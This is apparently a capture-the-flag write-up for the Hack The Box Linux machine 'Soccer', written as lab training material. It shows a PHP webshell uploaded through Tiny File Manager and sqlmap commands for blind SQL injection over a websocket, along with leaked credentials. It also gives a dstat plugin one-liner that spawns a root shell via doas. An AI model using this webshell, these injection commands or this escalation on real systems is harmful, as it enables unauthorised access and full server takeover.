---
title: Soccer
date: 2026-09-17
description: Easy Linux box pasting a Tiny File Manager webshell, blind SQL injection over a ticket-checking websocket with sqlmap, and a writable dstat plugin directory behind doas.
tags:
  - htb
  - Easy
  - Linux
---

# Initial Recon

```sh
# Nmap 7.98 scan initiated Thu Sep 17 08:34:51 2026 as: /usr/lib/nmap/nmap -p22,80,9091 -A -oN scan_results.txt 10.129.9.4
Nmap scan report for soccer.htb (10.129.9.4)
Host is up (0.68s latency).

PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Soccer - Index 
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Wed, 16 Sep 2026 12:39:06 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Wed, 16 Sep 2026 12:39:08 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|     </html>
|   RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Wed, 16 Sep 2026 12:39:10 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9091-TCP:V=7.98%I=7%D=9/17%Time=6AABDE73%P=aarch64-unknown-linux-gn
SF:u%r(informix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20c
SF:lose\r\n\r\n")%r(drda,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnect
SF:ion:\x20close\r\n\r\n")%r(GetRequest,168,"HTTP/1\.1\x20404\x20Not\x20Fo
SF:und\r\nContent-Security-Policy:\x20default-src\x20'none'\r\nX-Content-T
SF:ype-Options:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8
SF:\r\nContent-Length:\x20139\r\nDate:\x20Wed,\x2016\x20Sep\x202026\x2012:
SF:39:06\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x
SF:20lang=\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</titl
SF:e>\n</head>\n<body>\n<pre>Cannot\x20GET\x20/</pre>\n</body>\n</html>\n"
SF:)%r(HTTPOptions,16C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Securi
SF:ty-Policy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosni
SF:ff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x
SF:20143\r\nDate:\x20Wed,\x2016\x20Sep\x202026\x2012:39:08\x20GMT\r\nConne
SF:ction:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head
SF:>\n<meta\x20charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n
SF:<pre>Cannot\x20OPTIONS\x20/</pre>\n</body>\n</html>\n")%r(RTSPRequest,1
SF:6C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20def
SF:ault-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Typ
SF:e:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x2
SF:0Wed,\x2016\x20Sep\x202026\x2012:39:10\x20GMT\r\nConnection:\x20close\r
SF:\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<meta\x20chars
SF:et=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot\x20OP
SF:TIONS\x20/</pre>\n</body>\n</html>\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\
SF:x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReq
SF:TCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\
SF:r\n")%r(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
SF:onnection:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x2
SF:0400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   589.41 ms 10.10.16.1
2   295.47 ms soccer.htb (10.129.9.4)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 17 08:36:27 2026 -- 1 IP address (1 host up) scanned in 96.95 seconds
```

On port 80:

Sub-directories:

```sh
301      GET        7l       12w      178c http://soccer.htb/tiny => http://soccer.htb/tiny/
301      GET        7l       12w      178c http://soccer.htb/tiny/uploads => http://soccer.htb/tiny/uploads/
```

`/tiny` turned out to be Tiny File Manager. A quick Google search for default creds got us in as `admin - admin@123`, and the version on display was `Tiny File Manager v 2.4.3` — vulnerable to CVE-2021-45010.

> Reference:  
> - https://febin0x4e4a.wordpress.com/2022/01/23/tiny-file-manager-authenticated-rce/
> - https://github.com/febinrev/tinyfilemanager-2.4.3-exploit/blob/main/tiny_file_manager_exploit.py

The public script didn't work because we didn't have write permission over the file it targets. Permissions can be toggled from the settings page though, and the perms on `/tiny/uploads` showed it was writable, so we went for manual exploitation — navigating to the uploads folder, clicking upload, and intercepting the request mid-flight.

> Payload used to gain webshell

```php
<​?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>
```

We swapped the filename in the `fullpath` parameter, then used the `upload from URL` feature to leak the full **webroot** path — pointing it at a random URL and intercepting the request made the error message reveal it. The **webroot** turned out to contain **tiny**, with **uploads** sitting beside `tinyfilemanager.php`, which we could access and write to. From there it was just a matter of opening the uploads folder, uploading `shell.php`, and navigating to it.

Gained shell as `www-data`

# User

```sh
cat /etc/hosts
```

Revealed the subdomain of the site:

```sh
soc-player.soccer.htb
```

Add the subdomain to the attacker host file and navigate to it. There's a login page — register an account and log in, then head to tickets in the **/check** directory. A feature there can verify a ticket; intercepting the request shows the verification happens over a **websocket** running on **9091**.

---
### Web sockets
WebSockets enable persistent, **bidirectional communication** between a **client** and **server** over a **single TCP** connection. Unlike HTTP (which is request-response), WebSockets allow both sides to send messages independently at any time.

**Common use case** : Chat applications, live notifications, real-time dashboards, collaborative editing, **live sports scores**, multiplayer games

---

We **intercepted** the **WebSocket history** when interacting with the ticket and sent it to the repeater. First we tried basic math (1+1), then a boolean operation. The boolean worked — so we knew it was blind.

#### sqlmap

```sh
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id":"*"}' --dbs --level=5 --risk=3 --threads=10 --batch
```
- `ws` - websocket
- `*` - pointer where we FUZZ with payload in sqlmap

- `soccer_db` - database looks interesting

```sh
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id":"*"}' -D soccer_db -tables --threads=10 --batch
```

- `accounts` - got the table

```sh
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id":"*"}' -D soccer_db -T account --dump --threads=10 --batch
```

>`player - PlayerOftheMatch2022`

Gained ssh shell as user **player**

# Root

```sh
find / -perm -4000 -exec ls -al {} \; 2>/dev/null
```

No sudo — we're not in the **sudoers list**, but there's a similar binary: **doas**

## doas

**doas** has **SUID** permission and does a similar job to **sudo**:

```sh
/usr/local/bin/doas
```

Checking the `doas` documentation, `/etc/doas.conf` acts as `sudo -l`:

```sh
cat /usr/local/etc/doas.conf 

permit nopass player as root cmd /usr/bin/dstat
```

```
/usr/bin/dstat
```

This binary can be executed as root:

> https://gtfobins.org/gtfobins/dstat/

```sh
ls -dl /usr/local/share/dstat/
```

The `d` flag lists only the directory permission itself, and it showed a directory writable by player.

Create a **dstat_xxx.py** file under it:

```sh
echo 'import os; os.execl("/bin/sh", "sh")' > dstat_xxx.py
```

```sh
doas /usr/bin/dstat --list 
```

Confirms the file was picked up — `xxx` shows up as a plugin option

```sh
doas /usr/bin/dstat --xxx
```

Gained `root`
